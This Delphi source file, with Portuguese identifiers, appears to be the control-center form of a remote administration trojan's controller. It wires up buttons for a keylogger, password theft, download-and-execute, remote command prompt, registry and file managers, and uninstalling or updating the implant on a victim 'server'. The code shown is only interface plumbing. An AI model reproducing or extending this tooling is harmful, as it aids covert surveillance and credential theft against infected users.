unit UnitAll;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitMain, ComCtrls, sPageControl, sScrollBox, sFrameBar, ExtCtrls,
  sSplitter, UnitFrameAll, AdvPageControl, AppEvnts, sPanel, UnitFrameAllServer,
  UnitFrameAllExtras, UnitConexao;

type
  TFormAll = class(TForm)
    sFrameBar1: TsFrameBar;
    sSplitter1: TsSplitter;
    MainPanel: TsPanel;
    procedure sFrameBar1Items0CreateFrame(Sender: TObject;
      var Frame: TCustomFrame);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
    procedure sFrameBar1Items1CreateFrame(Sender: TObject;
      var Frame: TCustomFrame);
    procedure sFrameBar1Items2CreateFrame(Sender: TObject;
      var Frame: TCustomFrame);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    NomePC: string;

    FrameAll: TFrameAll;
    FrameAllServer: TFrameAllServer;
    FrameAllExtras: TFrameAllExtras;

    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdiomas;
    procedure AtualizarBitmap(Frame: TFrameAll);
    procedure AtualizarBitmapServer(Frame: TFrameAllServer);
    procedure AtualizarBitmapExtras(Frame: TFrameAllExtras);
    procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormAll: TFormAll;

implementation

{$R *.dfm}

uses
  CustomIniFiles,
  UnitStrings;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormAll.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdiomas;
end;

procedure TFormAll.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormAll.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  Params.WndParent := GetDesktopWindow;
end;

procedure TFormAll.AtualizarIdiomas;
begin
  sFrameBar1.Items.Items[0].Caption := FormMain.Funes1.Caption;
  sFrameBar1.Items.Items[1].Caption := FormMain.Opesdoservidor1.Caption;
  sFrameBar1.Items.Items[2].Caption := Traduzidos[600];

  if Assigned(FrameAll) then
  begin
    FrameAll.sWeblabel1.Caption := FormMain.Gerenciadordearquivos1.Caption;
    FrameAll.sWeblabel2.Caption := FormMain.Gerenciadordeprocessos1.Caption;
    FrameAll.sWeblabel3.Caption := FormMain.Gerenciadordejanelas1.Caption;
    FrameAll.sWeblabel4.Caption := FormMain.Gerenciadordeservios1.Caption;
    FrameAll.sWeblabel5.Caption := FormMain.Gerenciadorderegistros1.Caption;
    FrameAll.sWeblabel6.Caption := FormMain.Gerenciadordeclipboard1.Caption;
    FrameAll.sWeblabel7.Caption := FormMain.Programasinstalados1.Caption;
    FrameAll.sWeblabel8.Caption := FormMain.Listardispositivos1.Caption;
    FrameAll.sWeblabel9.Caption := FormMain.Portasativas1.Caption;
    FrameAll.sWeblabel10.Caption := FormMain.Prompt1.Caption;
    FrameAll.sWeblabel11.Caption := FormMain.Diversos1.Caption;
    FrameAll.sWeblabel12.Caption := FormMain.CHAT1.Caption;
    FrameAll.sWeblabel13.Caption := FormMain.Keylogger1.Caption;
    FrameAll.sWeblabel14.Caption := FormMain.MSN1.Caption;
  end;

  if Assigned(FrameAllserver) then
  begin
    FrameAllserver.sWeblabel1.Caption := FormMain.Desinstalar1.Caption;
    FrameAllserver.sWeblabel2.Caption := FormMain.Reconectar1.Caption;
    FrameAllserver.sWeblabel3.Caption := FormMain.Mudardegrupo1.Caption;
    FrameAllserver.sWeblabel4.Caption := FormMain.Renomear1.Caption;
    FrameAllserver.sWeblabel5.Caption := FormMain.Reiniciar1.Caption;
    FrameAllserver.sWeblabel6.Caption := FormMain.Desativar1.Caption;
    FrameAllserver.sWeblabel7.Caption := FormMain.Atualizarservidor1.Caption;

    FrameAllserver.RadioGroup1.Caption := Traduzidos[599] + ': ';
    FrameAllserver.RadioGroup1.Items.Strings[0] := FormMain.Arquivolocal1.Caption;
    FrameAllserver.RadioGroup1.Items.Strings[1] := FormMain.Linkhttp1.Caption;
    FrameAllserver.RadioGroup1.Items.Strings[2] := FormMain.Modificarconfiguraes1.Caption;
  end;

  if Assigned(FrameAllExtras) then
  begin
    FrameAllExtras.sWeblabel1.Caption := FormMain.Executarcomandos1.Caption;
    FrameAllExtras.sWeblabel2.Caption := FormMain.Baixareexecutar1.Caption;
    FrameAllExtras.sWeblabel3.Caption := FormMain.Abrirpginadainternet1.Caption;
    FrameAllExtras.sWeblabel4.Caption := FormMain.Enviararquivoseexecutar1.Caption;
    FrameAllExtras.sWeblabel5.Caption := FormMain.Passwords1.Caption;
    FrameAllExtras.sWeblabel6.Caption := FormMain.Procurararquivos1.Caption;
    FrameAllExtras.sWeblabel7.Caption := FormMain.Procurarpalavrasnokeylogger1.Caption;
    FrameAllExtras.sWeblabel8.Caption := FormMain.Proxy1.Caption;

    FrameAllExtras.RadioGroup1.Caption := Traduzidos[79] + ': ';
    FrameAllExtras.RadioGroup1.Items.Strings[0] := FormMain.Iniciar1.Caption;
    FrameAllExtras.RadioGroup1.Items.Strings[1] := FormMain.Parar1.Caption;
  end;
end;

constructor TFormAll.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);

  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('ControlCenter', 'Width', Width);
    Height := IniFile.ReadInteger('ControlCenter', 'Height', Height);
    Left := IniFile.ReadInteger('ControlCenter', 'Left', Left);
    Top := IniFile.ReadInteger('ControlCenter', 'Top', Top);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;
end;

procedure TFormAll.FormClose(Sender: TObject; var Action: TCloseAction);
var
  i: integer;
  TempStr: string;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('ControlCenter', 'Width', Width);
    IniFile.WriteInteger('ControlCenter', 'Height', Height);
    IniFile.WriteInteger('ControlCenter', 'Left', Left);
    IniFile.WriteInteger('ControlCenter', 'Top', Top);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

  if Servidor = nil then exit;
  if Servidor.MasterIdentification <> 1234567890 then Exit;

  FormMain.CheckForms(Servidor, False, True);
  Servidor.FormProcessos := nil;
  Servidor.FormWindows := nil;
  Servidor.FormServices := nil;
  Servidor.FormRegedit := nil;
  Servidor.FormShell := nil;
  Servidor.FormFileManager := nil;
  Servidor.FormClipboard := nil;
  Servidor.FormListarDispositivos := nil;
  Servidor.FormActivePorts := nil;
  Servidor.FormProgramas := nil;
  Servidor.FormDiversos := nil;
  //Servidor.FormDesktop := nil;
  //Servidor.FormWebcam := nil;
  //Servidor.FormAudioCapture := nil;
  Servidor.FormCHAT := nil;
  Servidor.FormKeylogger := nil;
  Servidor.FormServerSettings := nil;
  Servidor.FormMSN := nil;
end;

procedure TFormAll.FormShow(Sender: TObject);
begin
  sFrameBar1.OpenItem(0, True);
end;

procedure TFormAll.AtualizarBitmap(Frame: TFrameAll);
begin
  FormMain.ImageListDiversos.GetBitmap(FormMain.Gerenciadordearquivos1.ImageIndex, Frame.sSpeedButton1.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Gerenciadordeprocessos1.ImageIndex, Frame.sSpeedButton2.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Gerenciadordejanelas1.ImageIndex, Frame.sSpeedButton3.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Gerenciadordeservios1.ImageIndex, Frame.sSpeedButton4.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Gerenciadorderegistros1.ImageIndex, Frame.sSpeedButton5.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Gerenciadordeclipboard1.ImageIndex, Frame.sSpeedButton6.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Programasinstalados1.ImageIndex, Frame.sSpeedButton7.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Listardispositivos1.ImageIndex, Frame.sSpeedButton8.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Portasativas1.ImageIndex, Frame.sSpeedButton9.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Prompt1.ImageIndex, Frame.sSpeedButton10.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Diversos1.ImageIndex, Frame.sSpeedButton11.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.CHAT1.ImageIndex, Frame.sSpeedButton12.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Keylogger1.ImageIndex, Frame.sSpeedButton13.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.MSN1.ImageIndex, Frame.sSpeedButton14.Glyph);
end;

procedure TFormAll.AtualizarBitmapServer(Frame: TFrameAllServer);
begin
  FormMain.ImageListDiversos.GetBitmap(FormMain.Desinstalar1.ImageIndex, Frame.sSpeedButton1.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Reconectar1.ImageIndex, Frame.sSpeedButton2.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Mudardegrupo1.ImageIndex, Frame.sSpeedButton3.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Renomear1.ImageIndex, Frame.sSpeedButton4.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Reiniciar1.ImageIndex, Frame.sSpeedButton5.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Desativar1.ImageIndex, Frame.sSpeedButton6.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Atualizarservidor1.ImageIndex, Frame.sSpeedButton7.Glyph);
end;

procedure TFormAll.AtualizarBitmapExtras(Frame: TFrameAllExtras);
begin
  FormMain.ImageListDiversos.GetBitmap(FormMain.Executarcomandos1.ImageIndex, Frame.sSpeedButton1.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Baixareexecutar1.ImageIndex, Frame.sSpeedButton2.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Abrirpginadainternet1.ImageIndex, Frame.sSpeedButton3.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Enviararquivoseexecutar1.ImageIndex, Frame.sSpeedButton4.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Passwords1.ImageIndex, Frame.sSpeedButton5.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Procurararquivos1.ImageIndex, Frame.sSpeedButton6.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Procurarpalavrasnokeylogger1.ImageIndex, Frame.sSpeedButton7.Glyph);
  FormMain.ImageListDiversos.GetBitmap(FormMain.Proxy1.ImageIndex, Frame.sSpeedButton8.Glyph);
end;

procedure TFormAll.sFrameBar1Items0CreateFrame(Sender: TObject;
  var Frame: TCustomFrame);
begin
  Frame := TFrameAll.Create(Self, Servidor);
  AtualizarBitmap(TFrameAll(Frame));
  FrameAll := TFrameAll(Frame);

  FrameAllServer := nil;
  FrameAllExtras := nil;

  AtualizarIdiomas;
end;

procedure TFormAll.sFrameBar1Items1CreateFrame(Sender: TObject;
  var Frame: TCustomFrame);
begin
  Frame := TFrameAllServer.Create(Self, Servidor);
  AtualizarBitmapServer(TFrameAllServer(Frame));
  FrameAllServer := TFrameAllServer(Frame);

  FrameAll := nil;
  FrameAllExtras := nil;

  AtualizarIdiomas;
end;

procedure TFormAll.sFrameBar1Items2CreateFrame(Sender: TObject;
  var Frame: TCustomFrame);
begin
  Frame := TFrameAllExtras.Create(Self, Servidor);
  AtualizarBitmapExtras(TFrameAllExtras(Frame));
  FrameAllExtras := TFrameAllExtras(Frame);

  FrameAllServer := nil;
  FrameAll := nil;

  AtualizarIdiomas;
end;

end.
